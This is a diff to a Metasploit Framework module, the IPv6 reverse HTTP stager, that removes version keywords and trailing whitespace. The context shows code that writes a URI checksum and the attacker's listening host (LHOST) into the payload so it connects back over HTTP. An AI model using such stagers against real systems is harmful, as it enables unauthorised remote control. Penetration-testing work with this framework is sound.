@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -22,7 +18,6 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'Reverse HTTP Stager (IPv6)',
-			'Version'       => '$Revision$',
 			'Description'   => 'Tunnel communication over HTTP and IPv6',
 			'Author'        => 'hdm',
 			'License'       => MSF_LICENSE,
@@ -79,12 +74,12 @@ module Metasploit3
 		i = p.index("/12345\x00")
 		u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
 		p[i, u.length] = u
-		
+
 		lhost = datastore['LHOST'] || "0000:0000:0000:0000:0000:0000:0000:0000"
 		if Rex::Socket.is_ipv6?(lhost)
 			lhost = "[#{lhost}]"
 		end
-		
+
 		p + lhost + "\x00"
 	end
 
@@ -96,4 +91,3 @@ module Metasploit3
 	end
 
 end
-
